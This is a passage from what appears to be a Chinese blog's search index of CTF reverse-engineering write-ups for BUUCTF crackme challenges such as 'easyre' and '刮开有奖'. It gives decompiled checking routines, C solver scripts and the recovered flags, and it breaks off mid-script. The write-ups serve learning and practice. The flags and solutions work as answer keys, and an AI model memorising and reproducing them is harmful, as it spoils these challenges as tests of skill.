class="string">&#x27;@&#x27;</span> &amp;&amp; a1[<span class="number">3</span>] == <span class="string">&#x27;f&#x27;</span> &amp;&amp; a1[<span class="number">26</span>] == <span class="string">&#x27;r&#x27;</span> &amp;&amp; a1[<span class="number">20</span>] == <span class="string">&#x27;e&#x27;</span></span><br><span class="line">a1[<span class="number">7</span>] == <span class="string">&#x27;0&#x27;</span> &amp;&amp; a1[<span class="number">16</span>] == <span class="string">&#x27;_&#x27;</span> &amp;&amp; a1[<span class="number">11</span>] == <span class="string">&#x27;p&#x27;</span> &amp;&amp; a1[<span class="number">23</span>] == <span class="string">&#x27;e&#x27;</span> &amp;&amp; a1[<span class="number">30</span>] == <span class="string">&#x27;u&#x27;</span></span><br><span class="line">*a1 == <span class="string">&#x27;w&#x27;</span> &amp;&amp; a1[<span class="number">6</span>] == <span class="string">&#x27;2&#x27;</span> &amp;&amp; a1[<span class="number">22</span>] == <span class="string">&#x27;s&#x27;</span> &amp;&amp; a1[<span class="number">31</span>] == <span class="string">&#x27;n&#x27;</span> &amp;&amp; a1[<span class="number">12</span>] == <span class="string">&#x27;_&#x27;</span></span><br><span class="line">a1[<span class="number">15</span>] == <span class="string">&#x27;d&#x27;</span> &amp;&amp; a1[<span class="number">8</span>] == <span class="string">&#x27;&#123;&#x27;</span> &amp;&amp; a1[<span class="number">18</span>] == <span class="string">&#x27;3&#x27;</span> &amp;&amp; a1[<span class="number">28</span>] == <span class="string">&#x27;_&#x27;</span> &amp;&amp; a1[<span class="number">21</span>] == <span class="string">&#x27;r&#x27;</span></span><br><span class="line">a1[<span class="number">2</span>] == <span class="string">&#x27;t&#x27;</span> &amp;&amp; a1[<span class="number">9</span>] == <span class="string">&#x27;c&#x27;</span> &amp;&amp; a1[<span class="number">32</span>] == <span class="string">&#x27;&#125;&#x27;</span> &amp;&amp; a1[<span class="number">19</span>] == <span class="string">&#x27;v&#x27;</span> &amp;&amp; a1[<span class="number">5</span>] == <span class="string">&#x27;0&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">14</span>] == <span class="string">&#x27;n&#x27;</span></span><br><span class="line">a1[<span class="number">4</span>] == <span class="string">&#x27;2&#x27;</span> &amp;&amp; a1[<span class="number">17</span>] == <span class="string">&#x27;r&#x27;</span> &amp;&amp; a1[<span class="number">29</span>] == <span class="string">&#x27;f&#x27;</span> &amp;&amp; a1[<span class="number">17</span>] == <span class="string">&#x27;r&#x27;</span> &amp;&amp; a1[<span class="number">24</span>] == <span class="string">&#x27;_&#x27;</span></span><br><span class="line">a1[<span class="number">1</span>] == <span class="string">&#x27;c&#x27;</span> &amp;&amp; a1[<span class="number">25</span>] == <span class="string">&#x27;@&#x27;</span> &amp;&amp; a1[<span class="number">27</span>] == <span class="string">&#x27;e&#x27;</span></span><br></pre></td></tr></table></figure><p>整理一下顺序就行了。<br>flag{cpp_@nd_r3verse_@re_fun}</p><h1 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h1><p><a href="https://buuoj.cn/challenges#[ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020]easyre">题目链接</a><br>ida32打开，进入main函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+12h] [ebp-2Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+13h] [ebp-2Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [esp+14h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [esp+15h] [ebp-2Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [esp+16h] [ebp-2Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [esp+17h] [ebp-29h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [esp+18h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [esp+19h] [ebp-27h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [esp+1Ah] [ebp-26h]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [esp+1Bh] [ebp-25h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [esp+1Ch] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [esp+1Dh] [ebp-23h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [esp+1Eh] [ebp-22h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [esp+22h] [ebp-1Eh]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [esp+26h] [ebp-1Ah]</span></span><br><span class="line">  __int16 v19; <span class="comment">// [esp+2Ah] [ebp-16h]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [esp+2Ch] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [esp+2Dh] [ebp-13h]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [esp+2Eh] [ebp-12h]</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// [esp+2Fh] [ebp-11h]</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [esp+33h] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// [esp+37h] [ebp-9h]</span></span><br><span class="line">  <span class="keyword">char</span> v26; <span class="comment">// [esp+3Bh] [ebp-5h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+3Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  v4 = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">  v5 = <span class="string">&#x27;F&#x27;</span>;</span><br><span class="line">  v6 = <span class="string">&#x27;\&#x27;&#x27;</span>;</span><br><span class="line">  v7 = <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">  v8 = <span class="string">&#x27;N&#x27;</span>;</span><br><span class="line">  v9 = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">  v10 = <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">  v11 = <span class="string">&#x27;(&#x27;</span>;</span><br><span class="line">  v12 = <span class="string">&#x27;I&#x27;</span>;</span><br><span class="line">  v13 = <span class="string">&#x27;?&#x27;</span>;</span><br><span class="line">  v14 = <span class="string">&#x27;+&#x27;</span>;</span><br><span class="line">  v15 = <span class="string">&#x27;@&#x27;</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v19);</span><br><span class="line">  <span class="keyword">if</span> ( v19 != <span class="string">&#x27;A&#x27;</span> || HIBYTE(v19) != <span class="string">&#x27;C&#x27;</span> || v20 != <span class="string">&#x27;T&#x27;</span> || v21 != <span class="string">&#x27;F&#x27;</span> || v22 != <span class="string">&#x27;&#123;&#x27;</span> || v26 </span><br><span class="line">  != <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v16 = v23;</span><br><span class="line">  v17 = v24;</span><br><span class="line">  v18 = v25;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;v4 + i) != _data_start__[*(&amp;v16 + i) - <span class="number">1</span>] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入12个字符，这些字符代表的数字，就是_data_start__的下标+1.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> </span><br><span class="line">  a[<span class="number">96</span>]=&#123;<span class="number">0x7E</span>,<span class="number">0x7D</span>,<span class="number">0x7C</span>,<span class="number">0x7B</span>,<span class="number">0x7A</span>,<span class="number">0x79</span>,<span class="number">0x78</span>,<span class="number">0x77</span>,<span class="number">0x76</span>,<span class="number">0x75</span>,<span class="number">0x74</span>,<span class="number">0x73</span>,<span class="number">0x72</span>,<span class="number">0x71</span>,<span class="number">0x70</span>,<span class="number">0x6F</span>,</span><br><span class="line">    <span class="number">0x6E</span>,<span class="number">0x6D</span>,<span class="number">0x6C</span>,<span class="number">0x6B</span>,<span class="number">0x6A</span>,<span class="number">0x69</span>,<span class="number">0x68</span>,<span class="number">0x67</span>,<span class="number">0x66</span>,<span class="number">0x65</span>,<span class="number">0x64</span>,<span class="number">0x63</span>,<span class="number">0x62</span>,<span class="number">0x61</span>,<span class="number">0x60</span>,<span class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x5E</span>,<span class="number">0x5D</span>,<span class="number">0x5C</span>,<span class="number">0x5B</span>,<span class="number">0x5A</span>,<span class="number">0x59</span>,<span class="number">0x58</span>,<span class="number">0x57</span>,<span class="number">0x56</span>,<span class="number">0x55</span>,<span class="number">0x54</span>,<span class="number">0x53</span>,<span class="number">0x52</span>,<span class="number">0x51</span>,<span class="number">0x50</span>,<span class="number">0x4F</span>,</span><br><span class="line">    <span class="number">0x4E</span>,<span class="number">0x4D</span>,<span class="number">0x4C</span>,<span class="number">0x4B</span>,<span class="number">0x4A</span>,<span class="number">0x49</span>,<span class="number">0x48</span>,<span class="number">0x47</span>,<span class="number">0x46</span>,<span class="number">0x45</span>,<span class="number">0x44</span>,<span class="number">0x43</span>,<span class="number">0x42</span>,<span class="number">0x41</span>,<span class="number">0x40</span>,<span class="number">0x3F</span>,</span><br><span class="line">    <span class="number">0x3E</span>,<span class="number">0x3D</span>,<span class="number">0x3C</span>,<span class="number">0x3B</span>,<span class="number">0x3A</span>,<span class="number">0x39</span>,<span class="number">0x38</span>,<span class="number">0x37</span>,<span class="number">0x36</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x33</span>,<span class="number">0x32</span>,<span class="number">0x31</span>,<span class="number">0x30</span>,<span class="number">0x2F</span>,</span><br><span class="line">    <span class="number">0x2E</span>,<span class="number">0x2D</span>,<span class="number">0x2C</span>,<span class="number">0x2B</span>,<span class="number">0x2A</span>,<span class="number">0x29</span>,<span class="number">0x28</span>,<span class="number">0x27</span>,<span class="number">0x26</span>,<span class="number">0x25</span>,<span class="number">0x24</span>,<span class="number">0x23</span>,<span class="number">0x20</span>,<span class="number">0x21</span>,<span class="number">0x22</span>,<span class="number">0x00</span>,&#125;;</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">12</span>]=&#123;<span class="number">42</span>,<span class="number">70</span>,<span class="number">39</span>,<span class="number">34</span>,<span class="number">78</span>,<span class="number">44</span>,<span class="number">34</span>,<span class="number">40</span>,<span class="number">73</span>,<span class="number">63</span>,<span class="number">43</span>,<span class="number">64</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">12</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">96</span>;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[j]==b[i])</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,j+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{U9X_1S_W6@T?}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuctf——刮开有奖</title>
      <link href="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/"/>
      <url>/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/</url>
      
        <content type="html"><![CDATA[<h1 id="Buuctf——刮开有奖"><a href="#Buuctf——刮开有奖" class="headerlink" title="Buuctf——刮开有奖"></a>Buuctf——刮开有奖</h1><a id="more"></a><p><a href="https://buuoj.cn/challenges#%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96">题目链接</a><br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-dialogboxparama">DialogBoxParamA函数</a><br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getdlgitemtexta">GetDlgItemTextA函数</a></p><h2 id="1-查看文件信息"><a href="#1-查看文件信息" class="headerlink" title="1.查看文件信息"></a>1.查看文件信息</h2><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/1.png"></p><h2 id="2-分析伪代码"><a href="#2-分析伪代码" class="headerlink" title="2.分析伪代码"></a>2.分析伪代码</h2><p>32位ida打开，发现WinMain函数，然后查看伪代码。</p><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/2.png"></p><p>进入DialogFunc。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">BOOL __userpurge DialogFunc@&lt;eax&gt;(<span class="keyword">int</span> a1@&lt;edi&gt;, <span class="keyword">int</span> a2@&lt;esi&gt;, HWND hDlg, UINT a4, WPARAM </span><br><span class="line">a5, LPARAM a6)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v6; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v7; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+4h] [ebp-20030h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+8h] [ebp-2002Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [esp+Ch] [ebp-20028h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [esp+10h] [ebp-20024h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+14h] [ebp-20020h]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp+18h] [ebp-2001Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [esp+1Ch] [ebp-20018h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [esp+20h] [ebp-20014h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [esp+24h] [ebp-20010h]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [esp+28h] [ebp-2000Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [esp+2Ch] [ebp-20008h]</span></span><br><span class="line">  CHAR String; <span class="comment">// [esp+30h] [ebp-20004h]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [esp+31h] [ebp-20003h]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [esp+32h] [ebp-20002h]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [esp+33h] [ebp-20001h]</span></span><br><span class="line">  <span class="keyword">char</span> v24; <span class="comment">// [esp+34h] [ebp-20000h]</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// [esp+10030h] [ebp-10004h]</span></span><br><span class="line">  <span class="keyword">char</span> v26; <span class="comment">// [esp+10031h] [ebp-10003h]</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// [esp+10032h] [ebp-10002h]</span></span><br><span class="line">  <span class="keyword">int</span> v28; <span class="comment">// [esp+20028h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [esp+2002Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  __alloca_probe();</span><br><span class="line">  <span class="keyword">if</span> ( a4 == <span class="number">272</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v29 = a2;</span><br><span class="line">  v28 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a4 != <span class="number">273</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a5 == <span class="number">1001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;String, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">    GetDlgItemTextA(hDlg, <span class="number">1000</span>, &amp;String, <span class="number">0xFFFF</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;String) == <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="number">90</span>;</span><br><span class="line">      v10 = <span class="number">74</span>;</span><br><span class="line">      v11 = <span class="number">83</span>;</span><br><span class="line">      v12 = <span class="number">69</span>;</span><br><span class="line">      v13 = <span class="number">67</span>;</span><br><span class="line">      v14 = <span class="number">97</span>;</span><br><span class="line">      v15 = <span class="number">78</span>;</span><br><span class="line">      v16 = <span class="number">72</span>;</span><br><span class="line">      v17 = <span class="number">51</span>;</span><br><span class="line">      v18 = <span class="number">110</span>;</span><br><span class="line">      v19 = <span class="number">103</span>;</span><br><span class="line">      sub_4010F0(&amp;v9, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">      <span class="built_in">memset</span>(&amp;v25, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">      v6 = sub_401000(&amp;v25, <span class="built_in">strlen</span>(&amp;v25));</span><br><span class="line">      <span class="built_in">memset</span>(&amp;v25, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">      v26 = v23;</span><br><span class="line">      v25 = v22;</span><br><span class="line">      v27 = v24;</span><br><span class="line">      v7 = sub_401000(&amp;v25, <span class="built_in">strlen</span>(&amp;v25));</span><br><span class="line">      <span class="keyword">if</span> ( String == v9 + <span class="number">34</span></span><br><span class="line">        &amp;&amp; v21 == v13</span><br><span class="line">        &amp;&amp; <span class="number">4</span> * v22 - <span class="number">141</span> == <span class="number">3</span> * v11</span><br><span class="line">        &amp;&amp; v23 / <span class="number">4</span> == <span class="number">2</span> * (v16 / <span class="number">9</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v6, <span class="string">&quot;ak1w&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v7, <span class="string">&quot;V1Ax&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        MessageBoxA(hDlg, <span class="string">&quot;U g3t 1T!&quot;</span>, <span class="string">&quot;@_@&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a5 != <span class="number">1</span> &amp;&amp; a5 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  EndDialog(hDlg, a5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数sub_4010F0(&amp;v9, 0, 10)伪代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_4010F0</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  result = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = a2; i &lt;= a3; a2 = i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">4</span> * i;</span><br><span class="line">    v6 = *(<span class="number">4</span> * i + a1);</span><br><span class="line">    <span class="keyword">if</span> ( a2 &lt; result &amp;&amp; i &lt; result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; *(a1 + <span class="number">4</span> * result) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          ++i;</span><br><span class="line">          *(v5 + a1) = *(a1 + <span class="number">4</span> * result);</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">while</span> ( *(a1 + <span class="number">4</span> * i) &lt;= v6 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( ++i &gt;= result )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v5 = <span class="number">4</span> * i;</span><br><span class="line">          *(a1 + <span class="number">4</span> * result) = *(<span class="number">4</span> * i + a1);</span><br><span class="line">        &#125;</span><br><span class="line">        --result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( i &lt; result );</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">    *(a1 + <span class="number">4</span> * result) = v6;</span><br><span class="line">    sub_4010F0(a1, a2, i - <span class="number">1</span>);</span><br><span class="line">    result = a3;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是将v9-v19进行变化，得到新的v9-v19，以下为脚本。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_4010F0</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> v9[<span class="number">11</span>] = &#123;<span class="number">90</span>,<span class="number">74</span>,<span class="number">83</span>,<span class="number">69</span>,<span class="number">67</span>,<span class="number">97</span>,<span class="number">78</span>,<span class="number">72</span>,<span class="number">51</span>,<span class="number">110</span>,<span 